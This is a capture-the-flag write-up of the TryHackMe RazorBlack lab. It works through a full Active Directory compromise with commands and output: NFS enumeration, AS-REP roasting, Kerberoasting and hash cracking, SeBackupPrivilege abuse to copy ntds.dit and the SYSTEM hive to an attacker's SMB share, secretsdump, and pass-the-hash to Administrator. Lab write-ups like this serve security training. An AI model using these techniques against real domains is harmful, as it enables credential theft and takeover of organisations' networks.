---
categories: [TryHackMe]
tags: [ ASREPRoast, Kerberosting, PrivEsc, NFS, Active Directory, GetNPUsers.py, GetUserSPNs.py, PSCredential, SeBackupPrivilege]
media_subpath: /assets/images/
image:
  path: https://blog.apnic.net/wp-content/uploads/2019/10/ActiveDirectory_attack_banner-555x202.png?v=e8845f956b3e483ea2c96ce91004bf8e
  width: "1200"
  height: "630"
  alt: Active Directory Medium Level Machine 🎖️
---
## Port Scan Results ⤵️
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
└─$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.69.53 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 20:40 IST
Nmap scan report for 10.10.69.53
Host is up (0.21s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-27 15:25:04Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2024-02-26T15:09:49
|_Not valid after:  2024-08-27T15:09:49
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   DNS_Tree_Name: raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-27T15:25:55+00:00
|_ssl-date: 2024-02-27T15:26:04+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-27T15:25:59
|_  start_date: N/A
```
{: .nolineno}
## SMB Enumeration ⤵️

I check with no creds through `netexec` Tool and I got no access but I got the domain name like this ->
![Image](Pasted%20image%2020240227204858.png)
_Domain Name : raz0rblack.thm_
And I checked port scan where I noticed NFS Shares are enabled so lets access that .

## NFS Enumeration ⤵️

Lets acces NFS Shares with <span style="color:#00ff91">showmount</span> command 🔻
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
└─$ showmount -e 10.10.69.53                             
Export list for 10.10.69.53:
/users (everyone)
```
{: .nolineno}
I got a share named as <span style="color:#61ffe5">users</span> with access permissions to everyone. So lets access that ->
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
└─$ mkdir mnt               

┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
└─$ sudo mount -v -t nfs -o vers=3,proto=tcp,nolock 10.10.69.53:/users mnt/    
[sudo] password for kali: 
mount.nfs: timeout set for Tue Feb 27 20:46:14 2024
mount.nfs: trying text-based options 'vers=3,proto=tcp,nolock,addr=10.10.69.53'
mount.nfs: prog 100003, trying vers=3, prot=6
mount.nfs: trying 10.10.69.53 prog 100003 vers 3 prot TCP port 2049
mount.nfs: prog 100005, trying vers=3, prot=6
mount.nfs: trying 10.10.69.53 prog 100005 vers 3 prot TCP port 2049
```
{: .nolineno}
I have to be root to access that so lets see what inside of it ->
```bash
┌──(root㉿kali)-[/home/…/Downloads/Tryhackme/RazorBlack/mnt]
└─# ls -al
total 17
drwx------ 2 4294967294 4294967294   64 Feb 27  2021 .
drwxr-xr-x 3 kali       kali       4096 Feb 27 20:43 ..
-rwx------ 1 4294967294 4294967294 9861 Feb 25  2021 employee_status.xlsx
-rwx------ 1 4294967294 4294967294   80 Feb 26  2021 sbradley.txt
```
{: .nolineno}
I then copied it to my system and I got a flag from `sbrandley.txt` file and I got some users from `employee_status.xlsx` file ->
![Image](Pasted%20image%2020240227205522.png)
_Users information_
I performed user name mash program with these names like this ->
```python
#!/usr/bin/env python
import sys
import os.path

if __name__ == "__main__": 
    if len(sys.argv) != 2:
        print("usage: {} names.txt".format((sys.argv[0])))
        sys.exit(0)

    if not os.path.exists(sys.argv[1]): 
        print("{} not found".format(sys.argv[1]))
        sys.exit(0)

    for line in open(sys.argv[1]):
        name = ''.join([c for c in line if  c == " " or  c.isalpha()])

        tokens = name.lower().split()

        # skip empty lines
        if len(tokens) < 1: 
            continue

        fname = tokens[0]
        lname = tokens[-1]

        print(fname + lname)           # johndoe
        print(lname + fname)           # doejohn
        print(fname + "." + lname)     # john.doe
        print(lname + "." + fname)     # doe.john
        print(lname + fname[0])        # doej
        print(fname[0] + lname)        # jdoe
        print(lname[0] + fname)        # djoe
        print(fname[0] + "." + lname)  # j.doe
        print(lname[0] + "." + fname)  # d.john
        print(fname)                   # john
        print(lname)                   # joe
```
{: .nolineno}
I stored all those usernames in a file ->
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
└─$ python3 namemash.py users.txt > usernames.txt
```
{: .nolineno}
I then performed **<span style="color:#61ffe5">kerbrute userenum</span>** with this usernames.txt files and I got some hits like this 🔽
![Image](Pasted%20image%2020240227210236.png)
_kerbrute Tool from impackets_
I then stored all 3 usernames in `kerbrute_users.txt` file and lets perform AS-REP-ROASTING on these usernames , Lets see if I could get any ones TGT tickets.
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
└─$ /opt/Tools/impacket/examples/GetNPUsers.py -no-pass 'raz0rblack.thm/' -dc-ip 10.10.69.53 -request -usersfile kerbrute_users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User lvetrova does not have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:71ce9c8e792de43cac6adc8d22f3eaaf$0dbfd672df8f5262bb05d31c699d3d3962b6bc5ef2b416c63346eea4f7b47e6a0dc9a80850f959666d5a9919d0fb6032315e61629875923ca5f04876c4938f1ebd83559198306a1b9bd1cb151ad4397deed3171dc99ce3130721e3c78d968e13179b6d20ca874a8baced9b13431138c97cc12bbda88eabc7a7489e5549b13fea9497260da11eaa4c416f0d819a916708761985e28a07a42aad9133dd7cdaf4f5a57b707978189387956aa906aaa777ccae2d3cf07fc80c95e3432dd475d041a8f3360d231164df2628f355ab885ed84a496eeb867d40a3d499eda7423b0847c8db05ef............13f93d607f
[-] User sbradley does not have UF_DONT_REQUIRE_PREAUTH set
```
{: .nolineno}
Lets crack this hash with John The Ripper Tool ->
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD>    ($krb5asrep$23$twilliams@RAZ0RBLACK.THM)     
1g 0:00:00:12 DONE (2024-02-27 21:06) 0.08038g/s 339385p/s 339385c/s 339385C/s 
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno}
Lets see the privileges of this user 🔽
![Image](Pasted%20image%2020240227210939.png)
_Got access to SMB Shares_
I also tried to access any SPN ticket with the credentials of twilliams and I got it ->
![Image](Pasted%20image%2020240227211208.png)
_Got SPN ticket for user xyan1d3_
Lets crack this hash with previous way 🔻
```bash
┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt SPNticket.hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD> (?)     
1g 0:00:00:19 DONE (2024-02-27 21:13) 0.05115g/s 453597p/s 453597c/s 453597C/s 
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
{: .nolineno}
I now have the credentials of 2 user <span style="color:#00ff91">twilliams</span> and <span style="color:#00ff91">xyan1d3</span>.

I got this privileges from user xyan1d3 user ->
![Image](Pasted%20image%2020240227211956.png)
_I got winrm permissions_
Lets have a **winrm** session .
### WINRM SHELL ⏩

![Image](Pasted%20image%2020240227212249.png)
_WINRM Session_
```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> cat xyan1d3.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Nope your flag is not here</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2</SS>
    </Props>
  </Obj>
</Objs>
*Evil-WinRM* PS C:\Users\xyan1d3> 
```
{: .nolineno}
Lets try to crack this password ->
Here are 3 Steps to do so 😀
<mark style="background: #ABF7F7A6;">Step 1</mark> ⏩
Collect the credentials in a variable like this 🔻
```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> $user="Nope your flag is not here"
*Evil-WinRM* PS C:\Users\xyan1d3> $pass="01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2" | ConvertTo-SecureString
```
{: .nolineno}
<mark style="background: #ABF7F7A6;">Step 2</mark> ⏩
Now create the PSCredential Object passing the variables.
```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
```
{: .nolineno}
<mark style="background: #ABF7F7A6;">Step 3</mark> ⏩
Finally extract clear text information from the PSCredential Object.
```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> $cred.GetNetworkCredential() | fl


UserName       : Nope your flag is not here
Password       : LOL here it is -> THM{FLAG_FLAG_FLAG_FLAG}
SecurePassword : System.Security.SecureString
Domain         :
```
{: .nolineno}
Now I checked the privileges or permissions on this shell and I got this ->
```powershell
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami
raz0rblack\xyan1d3
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== =====================================raz0rblack\xyan1d3 S-1-5-21-3403444377-2687699443-13012745-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===========================================Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\xyan1d3\Documents>
```
{: .nolineno}
So I have <span style="color:#61ffe5">SeBackupPrivilege</span> Enable lets exploit that with this reference ->
https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960

I created a <span style="color:#ffff00"><mark style="background: #ADCCFFA6;">back_script.txt</mark></span> file like this ->
```text
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
{: .nolineno}
Now I executed it with **<mark style="background: #FAA3A3A6;">diskshadow</mark>** command like this 🔽
```powershell
*Evil-WinRM* PS C:\Windows\Temp> diskshadow /s C:\Users\xyan1d3\Documents\back_script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  HAVEN-DC,  2/27/2024 8:58:06 AM

-> set verbose on
-> set metadata C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
[...]
```
{: .nolineno}
Now I have to copy the <span style="color:#00ff91">ntds.dit</span> file.
```powershell
*Evil-WinRM* PS C:\Windows\Temp> cd E:\Windows\ntds
*Evil-WinRM* PS E:\Windows\ntds> dir


    Directory: E:\Windows\ntds


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/27/2024   8:59 AM           8192 edb.chk
-a----        2/27/2024   8:59 AM       10485760 edb.log
-a----        2/23/2021   7:00 AM       10485760 edb00001.log
-a----        2/23/2021   6:59 AM       10485760 edbres00001.jrs
-a----        2/23/2021   6:59 AM       10485760 edbres00002.jrs
-a----        2/27/2024   8:59 AM       16777216 ntds.dit
-a----        2/27/2024   8:59 AM          16384 ntds.jfm
-a----        2/27/2024   8:13 AM         434176 temp.edb


*Evil-WinRM* PS E:\Windows\ntds> cd ..\Temp
*Evil-WinRM* PS E:\Windows\Temp>
```
{: .nolineno}
I will be using `robocopy` command like this 🔻
```powershell
*Evil-WinRM* PS E:\Windows\Temp> robocopy /b E:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Tuesday, February 27, 2024 9:01:07 AM
   Source : E:\Windows\ntds\
     Dest : E:\Windows\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                   1	E:\Windows\ntds\
2024/02/27 09:01:07 ERROR 19 (0x00000013) Changing File Attributes E:\Windows\Temp\
The media is write protected.
```
{: .nolineno}
It did not work so I tried with method 2 of reference link and downloaded `SeBackupPrivilegeCmdLets.dll` and `SeBackupPrivilegeUtils.dll` files from https://github.com/giuliano108/SeBackupPrivilege that will enable the copy function.
```powershell
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> mkdir C:\Temp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/27/2024   9:09 AM                Temp


*Evil-WinRM* PS C:\Users\xyan1d3\Documents>
```
{: .nolineno}
Now lets copy that file into C:/Temp directory ->
```powershell
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> reg save hklm\system c:\temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> dir C:\Temp


    Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/27/2024   9:09 AM       16777216 ntds.dit
-a----        2/27/2024   9:09 AM       17223680 system


*Evil-WinRM* PS C:\Users\xyan1d3\Documents>
```
{: .nolineno}
Lastly I need to download both files into the attacker machines through anyways , I will be using download feature from **<span style="color:#f04276">evil-winrm</span>** Tool or I could also use smbserver to copy these files to my attacker machine like this 🔽
```powershell
*Evil-WinRM* PS C:\Temp> copy ntds.dit \\10.11.74.199\share\ntds.dit
*Evil-WinRM* PS C:\Temp> copy system \\10.11.74.199\share\system
```
{: .nolineno}
Now lets time to use <span style="color:#61ffe5">secretsdump.py </span>tool to extract the hashes like this 🔽
![Image](Pasted%20image%2020240228205813.png)
_Hashes extracted from secretsdump.py Tool from impackets_
Lets <span style="color:#fd77f8">pass the hash</span> and get administrators shell ->
```powershell
┌──(kali🔥kali)-[~/Downloads/Tryhackme/RazorBlack]
└─$ evil-winrm -i 10.10.220.237 -u 'Administrator' -H '<NT HASH>'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> tree /f /a
Folder PATH listing
Volume serial number is 0ABE-CF60
C:.
|   cookie.json
|   root.xml
|
+---3D Objects
+---Contacts
+---Desktop
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
*Evil-WinRM* PS C:\Users\Administrator> cat cookie.json
{
	auth : "TG9vayB0aGlzIGlzIHlvdXIgY29va2llLgpGdW5GYWN0IDogVGhpcyBjb29raWUgY2FuIGNoYW5nZSBpdHMgb3duIGZsYXZvdXIgYXV0b21hdGljYWxseS4gVG8gdGVzdCBpdCBqdXN0IHRoaW5rIG9mIHlvdXIgZmF2b3VyaXRlIGZsYXZvdXIuCgpBbmQgc3RvcCBwdXR0aW5nICdPUiAnMSc9JzEgaW5zaWRlIGxvZ2luLnB.............91ciBDb29raWU="
}
*Evil-WinRM* PS C:\Users\Administrator> cat root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2.............e63792e0a</SS>
  </Obj>
</Objs>
*Evil-WinRM* PS C:\Users\Administrator> 
```
{: .nolineno}
Lets crack this Password with that similar fashion of **system.txt** file ⏩
![Image](Pasted%20image%2020240228213717.png)
_Error while trying to Convert in String_
I think this value is <span style="color:#00ff91">hex encoded</span> so I tired decoding it in hex and I got this ->
![Image](Pasted%20image%2020240228214157.png)
_A root FLAG !_

I am administrator now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }